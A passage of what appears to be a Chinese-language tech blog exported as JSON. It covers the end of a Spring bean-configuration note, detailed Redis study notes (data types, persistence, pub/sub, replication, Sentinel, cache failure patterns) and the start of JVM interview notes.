\u0026lt;!--设置别名：在获取Bean的时候可以使用别名获取--\u0026gt; \u0026lt;alias name=\u0026#34;userT\u0026#34; alias=\u0026#34;userNew\u0026#34;/\u0026gt;   Bean的配置\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;!--bean就是java对象,由Spring创建和管理--\u0026gt;  \u0026lt;!--  id 是bean的标识符,要唯一,如果没有配置id,name就是默认标识符  如果配置id,又配置了name,那么name是别名  name可以设置多个别名,可以用逗号,分号,空格隔开  如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象;   class是bean的全限定名=包名+类名 --\u0026gt; \u0026lt;bean id=\u0026#34;hello\u0026#34; name=\u0026#34;hello2 h2,h3;h4\u0026#34; class=\u0026#34;com.kuang.pojo.Hello\u0026#34;\u0026gt;  \u0026lt;property name=\u0026#34;name\u0026#34; value=\u0026#34;Spring\u0026#34;/\u0026gt; \u0026lt;/bean\u0026gt;   import\n1  \u0026lt;import resource=\u0026#34;{path}/beans.xml\u0026#34;/\u0026gt;   ","permalink":"https://kevinerr.github.io/posts/tech/spring/","summary":"SSH Struts+Spring+Hibernate SSM SpringMVC+Spring+Mybatis ORM ORM就是对象关系匹配，是为了解决面向对象与关系数据库存在的互不匹配的问题。简单来说，就是把关系数据库中的数据转换成面向对象程序中","title":"spring"},{"content":"Redis常见面试题\nRedis(remote dictionary server) 远程字典服务\n1、 db，每次都从数据库中查\n2、 用一个List存储查的全部结果，然后再在List中过滤\n3、 本地缓存，同一个Map，开始时是空的，则查询数据库，并存入Map，之后直接从Map中查\n4、 如何解决分布式下缓存读写问题，每个微服务中有一个自己的Map，数据不一致\n5、 从分布式中抽离出一个缓存，so 缓存中间件redis\n干什么 内存存储、持久化，内存中是断电即失，所以持久化很重要（rdb、aof）\n将一些热点数据存储到Redis中，要用的时候，直接从内存取，极大的提高了速度和节约了服务器的开销。\n​ 1、会话缓存（最常用）\n​ 2、消息队列（支付）\n​ 3、活动排行榜或计数\n​ 4、发布，订阅消息（消息通知）\n​ 5、商品列表，评论列表\n特性 多样的数据类型\n持久化\n集群\n事务\n1 2 3 4 5 6 7 8  select 3 #选择数据库 DBSIZE #查看大小 flushdb #清空当前数据库 FLUSHALL #清空全部数据库 EXISTS name #是否存在key move name 1 #从0号移到1号 EXPIRE name 10 #10s过期 ttl name #查看还有多久过期   redis默认使用单线程，也支持多线程。多线程会产生cpu上下文切换\n5大数据类型 string（字符串）的类型 string 是 redis 最基本的类型，你可以理解成与 Memcached 一模一样个 key 对应一个 value。 string 类型是二进制安全的。意思是 redis 的 string 可以包含任何数据。比如jpg图片或者序列化的对象。 string 类型是 Redis 最基本的数据类型，string 类型的值最大能存储 512MB。\n实例 redis 127.0.0.1:6379\u0026gt; SET runoob \u0026ldquo;菜鸟教程\u0026rdquo; OK redis 127.0.0.1:6379\u0026gt; GET runoob\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  APPEND #追加字符串 STRLEN #字符串长度  incr #+1 decr #-1 INCRBY n#+n DECRBY n#-n  GETRANGE Key 0 3 #截取字符串[0,3] SETRANGE key 1 xx #替换指定位置的字符串  setex #设置过期时间 setnx #不存在就设置成功，存在则设置失败  mset #同时设置多个值 mget #同时获取多个值 msetnx #是一个原子操作，要么一起成功，要么一起失败  #设置一个对象 user:{id}:{filed} mset user:1:name zhangsan user:1:age 2 mset user:1:name user:1:age  getset #先get再set   应用\n 计数器 统计多单位的数量 粉丝数 对象缓存存储  hash（哈希） map\nRedis hash 是一个键值(key=\u0026gt;value)对集合。 Redis hash 是一个 string 类型的 field 和 value 的映射表，hash 特别适合用于存储对象。\n1 2 3 4 5 6 7  redis 127.0.0.1:6379\u0026gt; DEL runoob redis 127.0.0.1:6379\u0026gt; HMSET runoob field1 \u0026#34;Hello\u0026#34; field2 \u0026#34;World\u0026#34; \u0026#34;OK\u0026#34; redis 127.0.0.1:6379\u0026gt; HGET runoob field1 \u0026#34;Hello\u0026#34; redis 127.0.0.1:6379\u0026gt; HGET runoob field2 \u0026#34;World\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12  hset hget hmset hmget hgetall hdel #删除 hlen #长度 hexists hkeys #所有key hvals #所有value hincrby hsetnx   应用\nhash更适合对象的存储\nlist（列表） Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。\n1 2 3 4 5 6 7 8 9 10 11 12  redis 127.0.0.1:6379\u0026gt; DEL runoob redis 127.0.0.1:6379\u0026gt; lpush runoob redis (integer) 1 redis 127.0.0.1:6379\u0026gt; lpush runoob mongodb (integer) 2 redis 127.0.0.1:6379\u0026gt; lpush runoob rabbitmq (integer) 3 redis 127.0.0.1:6379\u0026gt; lrange runoob 0 10 1) \u0026#34;rabbitmq\u0026#34; 2) \u0026#34;mongodb\u0026#34; 3) \u0026#34;redis\u0026#34; redis 127.0.0.1:6379\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  LPUSH #将值插入列表头部 RPUSH #将值插入列表尾部  LPOP #移除列表的第一个元素 RPOP #移除列表的最后一个元素  lindex #通过下表获取列表的一个值 Llen #长度  lrange list 0 -1 #全部元素 lrem list 1 one #移除list集合中指定个数的value ltrim list 1 2 #通过下表截取指定的长度，list已经被改变了  rpoplpush #移除列表中最后一个元素，将它移动到新的列表中  linsert #将某个具体的value插入列中某个元素的前面或后面   应用\n队列 lpush rpop 栈 lpush lpop\nset（集合） Redis 的 Set 是 string 类型的无序集合。 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  redis 127.0.0.1:6379\u0026gt; DEL runoob redis 127.0.0.1:6379\u0026gt; sadd runoob redis (integer) 1 redis 127.0.0.1:6379\u0026gt; sadd runoob mongodb (integer) 1 redis 127.0.0.1:6379\u0026gt; sadd runoob rabbitmq (integer) 1 redis 127.0.0.1:6379\u0026gt; sadd runoob rabbitmq (integer) 0 redis 127.0.0.1:6379\u0026gt; smembers runoob  1) \u0026#34;redis\u0026#34; 2) \u0026#34;rabbitmq\u0026#34; 3) \u0026#34;mongodb\u0026#34;   1 2 3 4 5 6  sismember #判断一个值是否在集合中 scard #获取元素个数 srem #移除元素 srandmember #随机抽选出一个元素 spop #随机删除集合中的元素 smove #将一个指定的值移动到另一个set集合中   应用\n微博 b站共同关注（交集）\n1 2 3  SDIFF #差集 SINTER #交集 SUNION #并集   zset(sorted set：有序集合) Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。 不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。\nzset的成员是唯一的,但分数(score)却可以重复。\n1 2 3 4 5 6 7 8 9 10 11 12 13  redis 127.0.0.1:6379\u0026gt; DEL runoob redis 127.0.0.1:6379\u0026gt; zadd runoob 0 redis (integer) 1 redis 127.0.0.1:6379\u0026gt; zadd runoob 0 mongodb (integer) 1 redis 127.0.0.1:6379\u0026gt; zadd runoob 0 rabbitmq (integer) 1 redis 127.0.0.1:6379\u0026gt; zadd runoob 0 rabbitmq (integer) 0 redis 127.0.0.1:6379\u0026gt; ZRANGEBYSCORE runoob 0 1000 1) \u0026#34;mongodb\u0026#34; 2) \u0026#34;rabbitmq\u0026#34; 3) \u0026#34;redis\u0026#34;   1 2 3 4 5  ZRANGEBYSCORE #小到大 ZREVRANGEBYSCORE #大到小 zrange zrem zcard   应用\n排行榜\n普通消息，重要消息\n三种特殊数据类型 geospatial 地理位置 1 2 3 4 5 6 7 8 9 10  #添加地理位置 下载城市数据 java程序一次性导入 经度（-180-180）纬度（-85-85） 名称 geoadd china:city 116.40 39.90 beijing geoadd china:city 112.47 31.23 shanghai geoadd china:city 106.50 29.53 chongqing 114.05 22.52 shengzhen getpos china:city beijing #获取指定的经度和维度 getdist china:city beijing shanghai km #获取2地的直线距离 georadius china:city 110 30 1000 km withdist withcoord count 2 #找附近的人，获取指定数量的人 georadiusbymember china:city beijing 1000 km #找出指定元素周围的其他元素 geohash #将二维的经纬度转化为一维的字符串   底层原理是zset，可以用zset命令操作\nzrange china:city 0 -1\nhyperloglog 基数：不重复的元素\n网页的UV（一个人访问一个网站多次，只算一个人）\n传统：用set保存用户id ，保存了大量的id，但目的是计数\n1 2 3 4  pfadd mykey1 a b c d e pfadd mykey2 g h j k l e pfcount mykey1 pfmerge mykey3 mykey1 mykey2   优点：占用内存是一定的 12kb。0.81%的错误率！统计UV可以忽略不计\nbitmaps 位存储\n统计疫情感染人数： 0 1 0 1 0\n统计用户信息（是否活跃） 用户打卡。两个状态的\n1 2 3 4 5 6 7 8 9  setbit sign 0 1 setbit sign 1 1 setbit sign 2 1 setbit sign 3 1 setbit sign 4 1 setbit sign 5 1 setbit sign 6 0 #周一-周日的打卡 getbit sign 1 bitcount sign #统计打卡记录   SpringBoot springboot2.x后，原来使用的jedis被替换为了lettuce\njedis：采用的直连，多个线程操作的话，不安全，如果需要避免不安全，需要使用jedis pool连接；BIO模式\nlettuce：采用netty，实例可以在多个线程中共享 NIO模式\n1 2 3 4 5 6 7  RedisTemplate.opsForValue().set(key, value);  //封装一下 @Override  public void set(String key, String value) {  stringRedisTemplate.opsForValue().set(key, value);  }   事务 单个 Redis 命令的执行是原子性的，但 Redis 没有在事务上增加任何维持原子性的机制，所以 Redis 事务的执行并不是原子性的。 事务可以理解为一个打包的批量执行脚本，但批量指令并非原子化的操作，中间某条指令的失败不会导致前面已做指令的回滚，也不会造成后续的指令不做。\nRedis没有隔离级别的概念。\nRedis 事务可以一次执行多个命令， 并且带有以下三个重要的保证：\n 批量操作在发送 EXEC 命令前被放入队列缓存。 收到 EXEC 命令后进入事务执行，事务中任意命令执行失败，其余的命令依然被执行。 在事务执行过程，其他客户端提交的命令请求不会插入到事务执行命令序列中。  一个事务从开始到执行会经历以下三个阶段：\n 开始事务。 命令入队。 执行事务。  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  redis 127.0.0.1:6379\u0026gt; MULTI OK  redis 127.0.0.1:6379\u0026gt; SET book-name \u0026#34;Mastering C++ in 21 days\u0026#34; QUEUED  redis 127.0.0.1:6379\u0026gt; GET book-name QUEUED  redis 127.0.0.1:6379\u0026gt; SADD tag \u0026#34;C++\u0026#34; \u0026#34;Programming\u0026#34; \u0026#34;Mastering Series\u0026#34; QUEUED  redis 127.0.0.1:6379\u0026gt; SMEMBERS tag QUEUED  redis 127.0.0.1:6379\u0026gt; EXEC 1) OK 2) \u0026#34;Mastering C++ in 21 days\u0026#34; 3) (integer) 3 4) 1) \u0026#34;Mastering Series\u0026#34;  2) \u0026#34;C++\u0026#34;  3) \u0026#34;Programming\u0026#34; ```  discard #取消事务 #命令写错了全不会执行，  ## 消息通知 [消息通知]（https://waterwang.blog.csdn.net/article/details/113768448)  ## 管道 Redis是一种基于客户端-服务端模型以及请求/响应协议的TCP服务。这意味着通常情况下一个请求会遵循以下步骤： * 客户端向服务端发送一个查询请求，并监听Socket返回，通常是以阻塞模式，等待服务端响应。 * 服务端处理命令，并将结果返回给客户端。  ### Redis 管道技术 Redis 管道技术可以在服务端未响应时，客户端可以继续向服务端发送请求，并最终一次性读取所有服务端的响应。 管道技术最显著的优势是提高了 redis 服务的性能。   $(echo -en \u0026ldquo;PING\\r\\n SET runoobkey redis\\r\\nGET runoobkey\\r\\nINCR visitor\\r\\nINCR visitor\\r\\nINCR visitor\\r\\n\u0026rdquo;; sleep 10) | nc localhost 6379\n+PONG +OK redis :1 :2 :3``` 以上实例中我们通过使用 PING 命令查看redis服务是否可用， 之后我们设置了 runoobkey 的值为 redis，然后我们获取 runoobkey 的值并使得 visitor 自增 3 次。 在返回的结果中我们可以看到这些命令一次性向 redis 服务提交，并最终一次性读取所有服务端的响应\n悲观锁、乐观锁version\n使用watch 可以当做redis的乐观锁操作\n持久化 redis是内存数据库，如果不将内存中的数据保存到硬盘，数据将丢失。\nrdb（redis database） config get dir 得到dump.rdb的存放位置/usr/local/bin 只需要放在此目录下，启动就会自动扫描其中的数据\n快照形式是直接把内存中的数据保存到一个 dump 文件中，定时保存，保存策略。\n当 Redis 需要做持久化时，Redis 会 fork 一个子进程，子进程将数据写到磁盘上一个临时 RDB 文件中。当子进程完成写临时文件后，将原来的 RDB 替换掉，这样的好处就是可以 copy-on-write。\nRedis默认情况下，是快照 RDB 的持久化方式，将内存中的数据以快照的方式写入二进制文件中，默认的文件名是 dump.rdb 。当然我们也可以手动执行 save 或者 bgsave（异步）做快照。\nRDB 的优点:\n这种文件非常适合用于进行备份： 比如说，你可以在最近的 24 小时内，每小时备份一次 RDB 文件，并且在每个月的每一天，也备份一个 RDB 文件。 这样的话，即使遇上问题，也可以随时将数据集还原到不同的版本。RDB 非常适用于灾难恢复（disaster recovery）。\nRDB 的缺点:\n如果你需要尽量避免在服务器故障时丢失数据，那么 RDB 不适合你。 虽然 Redis 允许你设置不同的保存点（save point）来控制保存 RDB 文件的频率， 但是， 因为RDB 文件需要保存整个数据集的状态， 所以它并不是一个轻松的操作。 因此你可能会至少 5 分钟才保存一次 RDB 文件。 在这种情况下， **一旦发生故障停机， 你就可能**会丢****失好几分钟的数据。\n触发机制：\n save的规则满足的情况下 执行flushall命令 退出redis时  aof（append only file） 使用 AOF 做持久化，每一个写命令都通过write函数追加到 appendonly.aof 中,配置方式：启动 AOF 持久化的方式\n1 2 3 4 5 6 7  appendfsync yes appendfsync always #每次有数据修改发生时都会写入AOF文件。 appendfsync everysec #每秒钟同步一次，该策略为AOF的缺省策略。  redis-check-aof --fix appendonly.aof #修复文件   AOF 的优点\n使用 AOF 持久化会让 Redis 变得非常耐久（much more durable）：你可以设置不同的 fsync 策略，比如无 fsync ，每秒钟一次 fsync ，或者每次执行写入命令时 fsync 。 AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。\nAOF 的缺点\n对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关 闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。\n如果aof文件大于64m，将fork一个新进程重写。\n二者的区别 RDB持久化是指在指定的时间间隔内将内存中的数据集快照写入磁盘，实际操作过程是fork一个子进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储。\nAOF持久化以日志的形式记录服务器所处理的每一个写、删除操作，查询操作不会记录，以文本的方式记录，可以打开文件看到详细的操作记录。\nRDB 和 AOF ,我应该用哪一个？\n 如果你非常关心你的数据,但仍然可以承受数分钟以内的数据丢失， 那么你可以只使用 RDB 持久。 AOF 将 Redis 执行的每一条命令追加到磁盘中，处理巨大的写入会降低 Redis 的性能，不知道你是否可以接受。  数据库备份和灾难恢复：定时生成 RDB 快照（snapshot）非常便于进行数据库备份， 并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度要快。\nRedis 支持同时开启 RDB 和 AOF,系统重启后，Redis 会优先使用 AOF 来恢复数据，这样丢失的数据会最少。\nRedis 发布订阅 1 2 3 4 5 6  redis 127.0.0.1:6379**\u0026gt;** SUBSCRIBE runoobChat  Reading messages... **(**press Ctrl-C to quit**)** 1**)** \u0026#34;subscribe\u0026#34; 2**)** \u0026#34;redisChat\u0026#34; 3**)** **(**integer**)** 1   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  redis 127.0.0.1:6379\u0026gt; PUBLISH runoobChat \u0026#34;Redis PUBLISH test\u0026#34;  (integer) 1  redis 127.0.0.1:6379\u0026gt; PUBLISH runoobChat \u0026#34;Learn redis by runoob.com\u0026#34;  (integer) 1  \\# 订阅者的客户端会显示如下消息  1) \u0026#34;message\u0026#34; 2) \u0026#34;runoobChat\u0026#34; 3) \u0026#34;Redis PUBLISH test\u0026#34;  1) \u0026#34;message\u0026#34; 2) \u0026#34;runoobChat\u0026#34; 3) \u0026#34;Learn redis by runoob.com\u0026#34;   Redis是使用C实现的，通过分析Redis源码里的pubsub.c文件，了解发布和订阅机制的底层实现，藉此加深对Redis的理解。\nRedis通过publish、subscribe和psubscribe等命令实现发布和订阅功能。\n微信：\n通过subscribe命令订阅某频道后，redis-server里维护了一个字典，字典的键就是一个个频道，而字典的值则是一个链表，链表中保存了所有订阅这个channel的客户端。subscribe命令的关键，就是将客户端添加到给定channel的的订阅链表中。\n通过publish命令向订阅者发送消息，redis-server会使用给定的频道作为键，在它所维护的channel字典中查找记录了订阅这个频道的所有客户端的链表，遍历这个链表，将消息发布给所有订阅者。\nPub/Sub从字面上理解就是发布(Publish)与订阅(Subscribe)，在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这一功能最明显的用法就是用作实时消息系统，比如普通的即时聊天，群聊等功能。\n使用场景：\n1.实时消息系统\n2.实时聊天(频道当作聊天室，将信息回显给所有人即可)\n3.订阅，关注系统都是可以的\n稍微复杂的场景我们就会使用消息中间件MQ。\nRedis主从复制 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。master写，slave读。读写分离\n作用：\n数据冗余，热备份，持久化之外的一种数据冗余方式\n故障恢复\n负载均衡\n高可用基石\n1 2 3  info replication  slaveof 127.0.0.1 6379 #真实的应该在从机的conf文件里配置，这个方法重启这个从机就会重新变回主机   从机不能写\n全量同步 Redis全量复制一般发生在Slave初始化阶段，这时Slave需要将Master上的所有数据都复制一份。\n增量同步 Redis增量复制是指Slave初始化后开始正常工作时主服务器发生的写操作同步到从服务器的过程。 增量复制的过程主要是主服务器每执行一个写命令就会向从服务器发送相同的写命令，从服务器接收并执行收到的写命令。\nRedis主从同步策略 主从刚刚连接的时候，进行全量同步；全同步结束后，进行增量同步。当然，如果有需要，slave 在任何时候都可以发起全量同步。redis 策略是，无论如何，首先会尝试进行增量同步，如不成功，要求从机进行全量同步。\n注意点 如果多个Slave断线了，需要重启的时候，因为只要Slave启动，就会发送sync请求和主机全量同步，当多个同时出现的时候，可能会导致Master IO剧增宕机。\n哨兵模式（sentinel） 哨兵是Redis的一种运行模式，它专注于对Redis实例（主节点、从节点）运行状态的监控，并能够在主节点发生故障时通过一系列的机制实现选主及主从切换，实现故障转移，确保整个Redis系统的可用性。结合Redis的官方文档，可以知道Redis哨兵具备的能力有如下几个：\n  监控（Monitoring）：持续监控Redis主节点、从节点是否处于预期的工作状态。\n  通知（Notification）：哨兵可以把Redis实例的运行故障信息通过API通知监控系统或者其他应用程序。\n  自动故障恢复（Automatic failover）：当主节点运行故障时，哨兵会启动自动故障恢复流程：某个从节点会升级为主节点，其他从节点会使用新的主节点进行主从复制，通知客户端使用新的主节点进行。\n  配置中心（Configuration provider）：哨兵可以作为客户端服务发现的授权源，客户端连接到哨兵请求给定服务的Redis主节点地址。如果发生故障转移，哨兵会通知新的地址。这里要注意：哨兵并不是Redis代理，只是为客户端提供了Redis主从节点的地址信息。\n  准备三个redis配置文件，对应Redis的一主二从，文件名称及内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # redis-6379.conf* port 6379 daemonize yes pidfile /var/run/redis-6379.pid logfile \u0026#34;6379.log\u0026#34; dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; dbfilename dump-6379.rdb  *# redis-6380.conf* port 6380 daemonize yes pidfile /var/run/redis-6380.pid logfile \u0026#34;6380.log\u0026#34; dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; dbfilename dump-6380.rdb slaveof 127.0.0.1 6379  *# redis-6381.conf* port 6381 daemonize yes pidfile /var/run/redis-6381.pid logfile \u0026#34;6381.log\u0026#34; dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; dbfilename dump-6381.rdb slaveof 127.0.0.1 6379   准备三个Redis Sentinel配置文件，作为三个监控节点，文件及内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  # sentinel-26379.conf* port 26379 daemonize yes dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; logfile \u0026#34;26379.log\u0026#34; *# 配置监听的主服务器，这里sentinel monitor代表监控，mymaster代表服务器的名称，可以自定义，192.168.11.128代表监控的主服务器，6379代表端口，2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。* sentinel monitor mymaster 127.0.0.1 6379 2 *# 判断主节点时间* sentinel down-after-milliseconds mymaster 10000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000  *# sentinel-26380.conf* port 26380 daemonize yes dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; logfile \u0026#34;26380.log\u0026#34; *# 配置监听的主服务器，这里sentinel monitor代表监控，mymaster代表服务器的名称，可以自定义，192.168.11.128代表监控的主服务器，6379代表端口，2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。* sentinel monitor mymaster 127.0.0.1 6379 2 *# 判断主节点时间* sentinel down-after-milliseconds mymaster 10000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000  *# sentinel-26381.conf* port 26381 daemonize yes dir \u0026#34;/Users/eleme/raysonxin/docker/redis-docker/log\u0026#34; logfile \u0026#34;26381.log\u0026#34; *# 配置监听的主服务器，这里sentinel monitor代表监控，mymaster代表服务器的名称，可以自定义，192.168.11.128代表监控的主服务器，6379代表端口，2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。* sentinel monitor mymaster 127.0.0.1 6379 2 *# 判断主节点时间* sentinel down-after-milliseconds mymaster 10000 sentinel parallel-syncs mymaster 1 sentinel failover-timeout mymaster 180000   依次启动三个Redis Server，命令如下：\n1 2 3  redis-server conf/redis-6379.conf redis-server conf/redis-6380.conf redis-server conf/redis-6381.conf   依次启动三个Redis Sentinel，命令如下：\n1 2 3  redis-sentinel conf/redis-26379.conf redis-sentinel conf/redis-26380.conf redis-sentinel conf/redis-26381.conf   Redis缓存穿透和雪崩（服务器的高可用问题） 缓存穿透（查不到） 缓存穿透概念：key对应的数据在数据源并不存在，每次针对此key的请求从缓存获取不到，请求都会到数据源，从而可能压垮数据源。比如用一个不存在的用户id获取用户信息，不论缓存还是数据库都没有，若黑客利用此漏洞进行攻击可能压垮数据库。\n缓存穿透方案：最常见的则是采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被 这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。另外也有一个更为简单粗暴的方法（我们采用的就是这种），如果一个查询返回的数据为空（不管是数据不存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟。\n缓存击穿（查太多） 缓存击穿概念：key对应的数据存在，但在redis中过期，此时若有大量并发请求过来，这些请求发现缓存过期一般都会从后端DB加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端DB压垮。\n缓存击穿方案：\n  用互斥锁(mutex key)\n加锁保证只有一个线程进去db\n  业界比较常用的做法，是使用mutex。简单地来说，就是在缓存失效的时候（判断拿出来的值为空），不是立即去load db，而是先使用缓存工具的某些带成功操作返回值的操作（比如Redis的SETNX或者Memcache的ADD）去set一个mutex key，当操作返回成功时，再进行load db的操作并回设缓存；否则，就重试整个get缓存的方法。\nSETNX，是「SET if Not eXists」的缩写，也就是只有不存在的时候才设置，可以利用它来实现锁的效果。x\n缓存雪崩 缓存雪崩概念：当缓存服务器重启或者大量缓存集中在某一个时间段失效，这样在失效的时候，也会给后端系统(比如DB)带来很大压力。缓存集体过期或redis宕机\n双十一：停掉一些服务\n缓存雪崩方案：缓存失效时的雪崩效应对底层系统的冲击非常可怕！大多数系统设计者考虑用加锁或者队列的方式保证来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上。还有一个简单方案就时讲缓存失效时间分散开，比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。\n","permalink":"https://kevinerr.github.io/posts/tech/redis/","summary":"Redis常见面试题 Redis(remote dictionary server) 远程字典服务 1、 db，每次都从数据库中查 2、 用一个List存储查的全部结果，然后再在List中过滤 3、 本地缓存，同","title":"redis学习笔记"},{"content":"面试问题 谈谈对JVM的理解？java8虚拟机和以前有什么区别\n什么是OOM？什么是栈溢出StackOverFlowError？\nJVM的常用调优参数有哪些？\n内存快照如何抓取，怎么分析Dump文件？\n谈谈JVM中，类加载器的认识？\n在一个项目中突然出现了OOM故障，该怎么排除？\nJVM的内存模型和分区-详细到每个区放什么？\n堆里面的分区有哪些？有什么特点？\nGC的算法有哪些？\n轻GC和重GC\n1 2 3 4 5  首先 三者之间存在包含关系  JVM + 核心类库 = JRE  JRE + java开发工具（javac.exe/jar.exe) = JDK   什么是JVM？ Java Virtual Machine 即Java虚拟机\n我们知道Java语言有一个独特的优点就是可以跨平台\n像其它语言，比如C，我们要针对不同操作系统windos，mac……各出一套应用程序\n而Java则可以做到一个软件在任何的操作系统中都能执行，这就是JVM的功劳\n如下图 图片来自高新强老师JAVA课程 本来我们编写的Java代码计算机还是不认识的，但是我们在每一个操作系统上都会配置一个与之相对应的JVM，会帮我们把我们的Java代码翻译成对应操作系统可以识别的内容。\nJVM屏蔽了与具体操作系统平台相关的信息，使Java程序只需生成在Java虚拟机上运行的目标代码（字节码）,就可以在多种平台上不加修改地运行。JVM在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行。\nJava语言中的反编译一般指将class文件转换成java文件。\n所以说我们在第一次写Java程序时都要先把JVM给装好。\n什么是JRE？ Java Runtime Environment 即Java运行环境\nJVM + 核心类库 = JRE\n刚才不是说只需要装JVM吗？那这个JRE是个什么鬼东西？\n是因为只有JVM不能运行，它还需要核心类库，才能保证Java运行\n由于JRE包含JVM 因此我们只要直接安装JRE 就顺便把JVM安装了\n图片来自高新强老师JAVA课程\n什么是JDK? Java Development Kit 即Java开发工具包\nJRE + java开发工具（javac.exe/jar.exe) = JDK\n前面不是说安装了JRE以后,Java程序就可以运行了吗?那为啥子还要安装这个JDK?\n这是因为我们是开发人员,我们是写软件的,软件光能运行不行啊,得给我们一个地方让我们来写代码吧?所以就需要java开发工具给我们腾出一个地儿来,好让我们coding\n由于JDK包含JRE 因此我们只需要安装JDK就都有了\n类加载机制 类装载器（ClassLoader）（用来装载.class文件并初始化)\n执行引擎（执行字节码，或者执行本地方法） 运行时数据区（方法区、堆、java栈、PC寄存器、本地方法栈)\n堆（Heap） 它是JVM用来存储对象实例以及数组值的区域，可以认为Java中所有通过new创建的对象的内存都在此分配，Heap中的对象的内存需要等待GC进行回收。\n元空间逻辑上存在，物理上不存在，不放在虚拟机内存，而存储在本地内存中\n运行时常量池（Runtime Constant Pool） 存放的为类中的固定的常量信息、方法和Field的引用信息等，其空间从方法区域中分配。\n本地方法堆栈（Native Method Stacks） JVM采用本地方法堆栈来支持native方法的执行，此区域用于存储每个native方法调用的状态。\nPC寄存器 PC寄存器是用于存储每个线程下一步将执行的JVM指令，如该方法为native的，则PC寄存器中不存储任何信息。\n方法区 方法区：static、final、Class、常量池\n不止是存“方法”，而是存储整个 class文件的信息，JVM运行时，类加载器子系统将会提取 class文件里面的类信息，并将其存放在方法区中。例如类的名称、类的类型（枚举、类、接口）、字段、方法等等。\n方法区域存放了所加载的类的信息（名称、修饰符等）、类中的静态变量、类中定义为final类型的常量、类中的Field信息、类中的方法信息，当开发人员在程序中通过Class对象中的getName、isInterface等方法来获取信息时，这些数据都来源于方法区域，同时方法区域也是全局共享的，在一定的条件下它也会被GC，当方法区域需要使用的内存超过其允许的大小时，会抛出OutOfMemory的错误信息。\n栈 栈：栈内存，主管程序的运行，生命周期和线程同步\n 线程结束，栈内存就释放，对于栈来说，不存在垃圾回收问题 一旦线程结束，栈就over 栈：JVM栈中存放的为当前线程中局部8大基本类型（boolean、char、byte、short、int、long、float、double）、对象引用、实例的方法、部分的返回结果以及Stack Frame，非基本类型的对象在JVM栈上仅存放一个指向堆上的地址。 栈的运行原理：栈帧 栈满了：StackOverFlowError 栈+堆+方法区：交互关系 JVM栈是线程私有的，每个线程创建的同时都会创建JVM栈  双亲委派机制 工作原理：\n1）如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行；\n2）如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归,请求最终将到达项层的启动类加载器；\n3）如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派机制。\n作用：\n1）避免核心API被篡改\n2）避免类的重复加载\n1 2 3  AppClassLoader ExtClassLoader BootstrapClassloader #java获取不到，因为底层是c/c++   字节码执行机制 GC垃圾回收 GC (Garbage Collection)的基本原理：将内存中不再被使用的对象进行回收，GC中用于回收的方法称为收集器，由于GC需要消耗一些资源和时间，Java在对对象的生命周期特征进行分析后，按照新生代、旧生代的方式来对对象进行收集，以尽可能的缩短GC对应用造成的暂停\n（1）对新生代的对象的收集称为minor GC； （2）对旧生代的对象的收集称为Full GC； （3）程序中主动调用System.gc()强制执行的GC为Full GC。\n不同的对象引用类型， 